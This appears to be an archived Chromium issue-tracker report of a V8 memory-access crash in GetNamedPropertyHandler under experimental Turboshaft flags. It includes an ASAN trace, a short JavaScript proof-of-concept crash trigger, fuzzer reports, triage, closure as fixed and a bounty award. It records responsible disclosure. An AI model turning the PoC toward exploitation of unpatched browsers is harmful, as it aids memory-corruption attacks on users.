# Security: Experimental features : ASAN error : GetNamedPropertyHandler

| Field | Value |
|-------|-------|
| **Issue ID** | [40069590](https://issues.chromium.org/issues/40069590) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | sw...@gmail.com |
| **Assignee** | ni...@chromium.org |
| **Created** | 2023-08-15 |
| **Bounty** | $7,000.00 |

## Description

**VULNERABILITY DETAILS**

```
V8 is running with experimental features enabled. Stability and security will suffer.  
=================================================================  
==22876==ERROR: AddressSanitizer: access-violation on unknown address 0x1235beadbefa (pc 0x7ff6acc75226 bp 0x0011027fe9f8 sp 0x0011027fe9a0 T0)  
==22876==The signal is caused by a READ memory access.  
==22876==\*\*\* WARNING: Failed to initialize DbgHelp!              \*\*\*  
==22876==\*\*\* Most likely this means that the app is already      \*\*\*  
==22876==\*\*\* using DbgHelp, possibly with incompatible flags.    \*\*\*  
==22876==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  
==22876==\*\*\* or produce wrong results.                           \*\*\*  
==22876==WARNING: Failed to use and restart external symbolizer!  
    #0 0x7ff6acc75225 in Builtins_GetNamedPropertyHandler+0x65 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145f45225)  
    #1 0x7ff6acab1d23 in Builtins_InterpreterEntryTrampoline+0xe3 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d81d23)  
    #2 0x7ff6acab1d23 in Builtins_InterpreterEntryTrampoline+0xe3 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d81d23)  
    #3 0x7ff6acab1d23 in Builtins_InterpreterEntryTrampoline+0xe3 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d81d23)  
    #4 0x7ff6acaae1f1 in Builtins_JSConstructStubGeneric+0x131 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d7e1f1)  
    #5 0x7ff6acc46c0c in Builtins_TypedArrayPrototypeSlice+0x14cc (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145f16c0c)  
    #6 0x7ff6acab1d23 in Builtins_InterpreterEntryTrampoline+0xe3 (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d81d23)  
    #7 0x7ff6acaaf35b in Builtins_JSEntryTrampoline+0x5b (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d7f35b)  
    #8 0x7ff6acaaef5a in Builtins_JSEntry+0xda (C:\Users\zzj\Downloads\win64-debug_d8-asan-win64-debug-v8-component-89518\d8-asan-win64-debug-v8-component-89518\d8.exe+0x145d7ef5a)  
    #9 0x7ff6a79d4919 in v8::internal::`anonymous namespace'::Invoke C:\b\s\w\ir\cache\builder\v8\src\execution\execution.cc:427  
    #10 0x7ff6a79d958b in v8::internal::Execution::CallScript C:\b\s\w\ir\cache\builder\v8\src\execution\execution.cc:540  
    #11 0x7ff6a6e5dcb5 in v8::Script::Run C:\b\s\w\ir\cache\builder\v8\src\api\api.cc:2131  
    #12 0x7ff6a6e5d16c in v8::Script::Run C:\b\s\w\ir\cache\builder\v8\src\api\api.cc:2094  
    #13 0x7ff6a6d7b5ee in v8::Shell::ExecuteString C:\b\s\w\ir\cache\builder\v8\src\d8\d8.cc:958  
    #14 0x7ff6a6dc2608 in v8::SourceGroup::Execute C:\b\s\w\ir\cache\builder\v8\src\d8\d8.cc:4442  
    #15 0x7ff6a6dcd6e3 in v8::Shell::RunMainIsolate C:\b\s\w\ir\cache\builder\v8\src\d8\d8.cc:5247  
    #16 0x7ff6a6dcc707 in v8::Shell::RunMain C:\b\s\w\ir\cache\builder\v8\src\d8\d8.cc:5168  
    #17 0x7ff6a6dd2099 in v8::Shell::Main C:\b\s\w\ir\cache\builder\v8\src\d8\d8.cc:6030  
    #18 0x7ff6accc313b in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288  
    #19 0x7ffbd11726ac in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126ac)  
    #20 0x7ffbd306aa67 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005aa67)  

```

**VERSION**  

v8:head  

download: <https://www.googleapis.com/download/storage/v1/b/v8-asan/o/win64-debug%2Fd8-asan-win64-debug-v8-component-89518.zip?generation=1692085787691790&alt=media>

**REPRODUCTION CASE**  

PoC:

```
const v2 = new Int8Array();  
function f3(a4, a5) {  
    const v8 = this.__proto__.constructor;  
    const o19 = {  
        o(a10, a11, a12, a13) {  
            try {  
                ArrayBuffer(a11, this);  
            } catch(e15) {  
                gc();  
                e15.stack;  
            }  
            return Int8Array;  
        },  
    };  
    o19.o();  
    return v8();  
}  
Object.defineProperty(f3, Symbol.species, { configurable: true, value: f3 });  
v2.constructor = f3;  
v2.slice();  

```

run:

.\d8.exe --expose-gc --future --always-turbofan --turboshaft-future poc.js  

**CREDIT INFORMATION**

Reporter credit: Zhenjiang Zhao of pangu team.

## Timeline

### [Deleted User] (2023-08-15)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-08-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5927538804850688.

### cl...@chromium.org (2023-08-16)

ClusterFuzz testcase 5927538804850688 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2023-08-16)

Detailed Report: https://clusterfuzz.com/testcase?key=5927538804850688

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7e3b00202578
Crash State:
  unsigned int v8::base::AsAtomicImpl<int>::Relaxed_Load<unsigned int>
  v8::internal::TaggedField<v8::internal::MapWord, 0, v8::internal::V8HeapCompress
  v8::internal::HeapObject::map
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=89523

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5927538804850688

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### an...@chromium.org (2023-08-16)

Doesn't look like CF reproduced the same crash. Assigning provisional FoundIn and Severity and forwarding to V8 Sheriff.

[Monorail components: Blink>JavaScript>Compiler>Turbofan]

### an...@chromium.org (2023-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-08-16)

I can reproduce locally. Running bisection.

### an...@chromium.org (2023-08-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-08-16)

Detailed Report: https://clusterfuzz.com/testcase?key=5927538804850688

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7e3b00202578
Crash State:
  unsigned int v8::base::AsAtomicImpl<int>::Relaxed_Load<unsigned int>
  v8::internal::TaggedField<v8::internal::MapWord, 0, v8::internal::V8HeapCompress
  v8::internal::HeapObject::map
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=89523

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5927538804850688

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

The recommended severity (Security_Severity-Medium) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### cl...@chromium.org (2023-08-16)

Bisection resulted in:

44c61206f4d39216e295aa12c05b8bb3233e15f0 is the first bad commit
commit 44c61206f4d39216e295aa12c05b8bb3233e15f0
Author: Nico Hartmann <nicohartmann@chromium.org>
Date:   Tue Aug 8 08:28:41 2023 +0200

    [turboshaft] Enable --turboshaft-instruction-selection on x64 future
    
    Bug: v8:12783
    Change-Id: I1e4b2802e566c5ce9366279a04535c74f5da2b3f
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4758260
    Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#89422}


This is thus not impacting anyone as Turboshaft is disabled currently. Nico, can you take a look?

Please updated labels accordingly; I don't think that this affects extended releases.

### cl...@chromium.org (2023-08-16)

Sorry, wrote the last sentence after realizing that the second-last might not be correct because we are finching Turboshaft already. So there might be some security impact.

### [Deleted User] (2023-08-16)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-16)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-29)

nicohartmann: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ni...@chromium.org (2023-08-30)

This is behind experimental flags, changing security impact.

### cl...@chromium.org (2023-08-30)

Detailed Report: https://clusterfuzz.com/testcase?key=5927538804850688

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7e3b00202578
Crash State:
  unsigned int v8::base::AsAtomicImpl<int>::Relaxed_Load<unsigned int>
  v8::internal::TaggedField<v8::internal::MapWord, 0, v8::internal::V8HeapCompress
  v8::internal::HeapObject::map
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=89523

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5927538804850688

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

The recommended severity (Security_Severity-Medium) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### ch...@chromium.org (2023-12-01)

Turboshaft looks to be launched now. Setting labels accordingly.

nicohartmann@: Could you please post an update to the bug?

### [Deleted User] (2023-12-02)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-10)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-11)

[Empty comment from Monorail migration]

### ad...@google.com (2024-01-25)

(I am a bot: this is an auto-cc on a security bug)

### am...@chromium.org (2024-01-25)

[Empty comment from Monorail migration]

### ad...@google.com (2024-01-26)

(I am a bot: this is an auto-cc on a security bug)

### is...@google.com (2024-01-26)

This issue was migrated from crbug.com/chromium/1472976?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### ri...@google.com (2024-10-14)

[secondary shephard] [nicohartmann@chromium.org](mailto:nicohartmann@chromium.org), looks like Turboshaft is launched (<https://crbug.com/42202729>), is the security impact still accurate?

### ph...@chromium.org (2025-01-02)

[Secondary security shepherd]

I tried to reproduce but got

```
/usr/local/google/home/phao/Downloads/40069590/poc.js:20: TypeError: Method %TypedArray%.prototype.slice called on incompatible receiver [object global]
v2.slice();
   ^
TypeError: Method %TypedArray%.prototype.slice called on incompatible receiver [object global]
    at Int8Array.slice (<anonymous>)
    at /usr/local/google/home/phao/Downloads/40069590/poc.js:20:4

```

so I'm not sure whether this is still reproducible.

nicohartmann@: Could you please help confirm whether this issue is still reproducible and if the security impact is accurate please? [will schedule a direct ping too]

### ni...@chromium.org (2025-01-09)

Cannot reproduce this anymore. Most likely this has been fixed in the meantime. Closing as fixed.

### sp...@google.com (2025-01-17)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
report of memory corruption in a sandboxed process / the renderer 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-17)

Congratulations -- thank you for your efforts and reporting this issue to us!

### ch...@google.com (2025-04-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> report of memory corruption in a sandboxed process / the renderer

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40069590)*
